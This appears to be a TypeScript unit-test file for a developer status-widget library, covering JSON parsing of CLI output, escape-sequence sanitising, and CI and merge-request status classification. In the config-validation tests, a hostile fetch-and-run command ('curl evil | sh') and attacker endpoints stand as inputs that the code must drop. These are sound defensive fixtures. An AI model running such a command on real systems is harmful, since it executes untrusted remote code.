import { describe, expect, test } from "bun:test"
import {
  DEFAULTS,
  ago,
  classifyCi,
  classifyMr,
  firstJson,
  fromOptions,
  fromStorage,
  safe,
} from "../lib.ts"

describe("firstJson", () => {
  test("parses a bare JSON array (gh run list)", () => {
    const out = firstJson(`[{"status":"completed","conclusion":"success","displayTitle":"fix: x"}]`)
    expect(Array.isArray(out)).toBe(true)
    expect(out[0].conclusion).toBe("success")
  })
  test("parses a bare JSON object (bw status)", () => {
    const out = firstJson(`{"serverUrl":"https://x","status":"unlocked"}`)
    expect(out.status).toBe("unlocked")
  })
  test("parses json with leading non-json preamble", () => {
    const out = firstJson(`some preamble text\n{"status":"locked"}\n`)
    expect(out.status).toBe("locked")
  })
  test("throws on no json", () => {
    expect(() => firstJson("no json here")).toThrow()
  })
  test("throws on empty output", () => {
    expect(() => firstJson("")).toThrow()
  })
  test("throws on truncated json", () => {
    expect(() => firstJson(`{"status":"lo`)).toThrow()
  })
})

describe("safe", () => {
  test("strips CSI escape sequences", () => {
    expect(safe("\x1b[31mfailed\x1b[0m")).toBe("failed")
  })
  test("strips non-CSI escapes (cursor movement)", () => {
    expect(safe("a\x1b2Bb")).toBe("aBb")
  })
  test("strips control characters and newlines", () => {
    expect(safe("line1\nline2\ttab\x00nul")).toBe("line1line2tabnul")
  })
  test("truncates to 80 characters", () => {
    expect(safe("x".repeat(200)).length).toBeLessThanOrEqual(80)
  })
  test("plain text passes through", () => {
    expect(safe("fix: close dual-review findings")).toBe("fix: close dual-review findings")
  })
})

describe("ago", () => {
  test("now for fresh timestamps", () => {
    expect(ago(Date.now())).toBe("now")
  })
  test("minutes", () => {
    expect(ago(Date.now() - 5 * 60_000)).toBe("5m")
  })
  test("hours", () => {
    expect(ago(Date.now() - 90 * 60_000)).toBe("2h")
  })
})

describe("fromOptions (display-only — hostile fields dropped)", () => {
  test("drops command and endpoint from options", () => {
    const cfg = fromOptions("vault", { command: "curl evil | sh" } as any)
    expect((cfg as any).command).toBeUndefined()
    expect(cfg.enabled).toBe(DEFAULTS.widgets.vault.enabled)
  })
  test("drops endpoint from vpn options", () => {
    const cfg = fromOptions("vpn", { endpoint: "https://attacker.example" } as any)
    expect(cfg.endpoint).toBe(DEFAULTS.widgets.vpn.endpoint)
  })
  test("clamps interval to the floor", () => {
    expect(fromOptions("ci", { interval: 0 }).interval).toBe(DEFAULTS.widgets.ci.interval)
    expect(fromOptions("ci", { interval: 5 }).interval).toBe(DEFAULTS.widgets.ci.interval)
    expect(fromOptions("ci", { interval: "60" as any }).interval).toBe(DEFAULTS.widgets.ci.interval)
  })
  test("accepts a sane interval", () => {
    expect(fromOptions("ci", { interval: 30_000 }).interval).toBe(30_000)
  })
  test("unknown surface falls back to default", () => {
    expect(fromOptions("mr", { surface: "sideways" as any }).surface).toBe(DEFAULTS.widgets.mr.surface)
  })
  test("enabled toggles", () => {
    expect(fromOptions("ci", { enabled: false }).enabled).toBe(false)
  })
  test("garbage input falls back to defaults", () => {
    expect(fromOptions("ci", "junk" as any)).toEqual(DEFAULTS.widgets.ci)
    expect(fromOptions("ci", undefined)).toEqual(DEFAULTS.widgets.ci)
  })
})

describe("fromStorage (dialog-writable, validated on read)", () => {
  test("accepts an https endpoint", () => {
    expect(fromStorage("vpn", { endpoint: "https://gitlab.example" }).endpoint).toBe("https://gitlab.example")
  })
  test("rejects a non-https endpoint", () => {
    expect(fromStorage("vpn", { endpoint: "http://attacker.example" }).endpoint).toBe(DEFAULTS.widgets.vpn.endpoint)
  })
  test("rejects a non-https endpoint for other widgets too", () => {
    expect(fromStorage("ci", { endpoint: "https://x" } as any).endpoint).toBeUndefined()
  })
  test("clamps hostile intervals from storage", () => {
    expect(fromStorage("vault", { interval: 1 }).interval).toBe(DEFAULTS.widgets.vault.interval)
  })
})

describe("classifyCi (github)", () => {
  test("success", () => {
    const r = classifyCi("github", `[{"status":"completed","conclusion":"success","displayTitle":"fix: x"}]`)
    expect(r.status).toBe("ok")
    expect(r.detail).toBe("fix: x")
  })
  test("failure", () => {
    expect(classifyCi("github", `[{"status":"completed","conclusion":"failure","displayTitle":"t"}]`).status).toBe("fail")
  })
  test("in progress", () => {
    expect(classifyCi("github", `[{"status":"in_progress","conclusion":null,"displayTitle":"t"}]`).status).toBe("warn")
  })
  test("no runs", () => {
    expect(classifyCi("github", `[]`).status).toBe("unknown")
  })
  test("malformed output", () => {
    expect(classifyCi("github", "not json").detail).toBe("parse")
  })
  test("ansi escapes in displayTitle are sanitized", () => {
    // gh serializes control chars escaped (\u001b) — as it would in real output
    const r = classifyCi("github", `[{"status":"completed","conclusion":"success","displayTitle":"\\u001b[31mfailed\\u001b[0m"}]`)
    expect(r.status).toBe("ok")
    expect(r.detail).toBe("failed")
  })
})

describe("classifyCi (gitlab)", () => {
  test("success", () => {
    const r = classifyCi("gitlab", `[{"iid":216,"status":"success","ref":"main"}]`)
    expect(r.status).toBe("ok")
    expect(r.detail).toBe("main")
  })
  test("failed", () => {
    expect(classifyCi("gitlab", `[{"status":"failed","ref":"main"}]`).status).toBe("fail")
  })
  test("running", () => {
    expect(classifyCi("gitlab", `[{"status":"running","ref":"main"}]`).status).toBe("warn")
  })
  test("pending", () => {
    expect(classifyCi("gitlab", `[{"status":"pending","ref":"main"}]`).status).toBe("warn")
  })
  test("no pipelines", () => {
    expect(classifyCi("gitlab", `[]`).status).toBe("unknown")
  })
})

describe("classifyMr (github)", () => {
  test("open + APPROVED", () => {
    expect(classifyMr("github", `{"state":"open","reviewDecision":"APPROVED","number":42}`).status).toBe("ok")
  })
  test("open + CHANGES_REQUESTED", () => {
    expect(classifyMr("github", `{"state":"open","reviewDecision":"CHANGES_REQUESTED","number":42}`).status).toBe("fail")
  })
  test("open + no reviews yet", () => {
    expect(classifyMr("github", `{"state":"open","reviewDecision":null,"number":42}`).status).toBe("warn")
  })
  test("merged", () => {
    const r = classifyMr("github", `{"state":"merged","number":42}`)
    expect(r.status).toBe("ok")
    expect(r.detail).toBe("#42 merged")
  })
})

describe("classifyMr (gitlab)", () => {
  test("opened", () => {
    const r = classifyMr("gitlab", `[{"iid":79,"state":"opened","title":"x"}]`)
    expect(r.status).toBe("warn")
    expect(r.detail).toBe("!79 open")
  })
  test("merged", () => {
    expect(classifyMr("gitlab", `[{"iid":79,"state":"merged"}]`).status).toBe("ok")
  })
  test("closed", () => {
    expect(classifyMr("gitlab", `[{"iid":79,"state":"closed"}]`).status).toBe("unknown")
  })
  test("no mrs", () => {
    expect(classifyMr("gitlab", `[]`).status).toBe("unknown")
  })
})
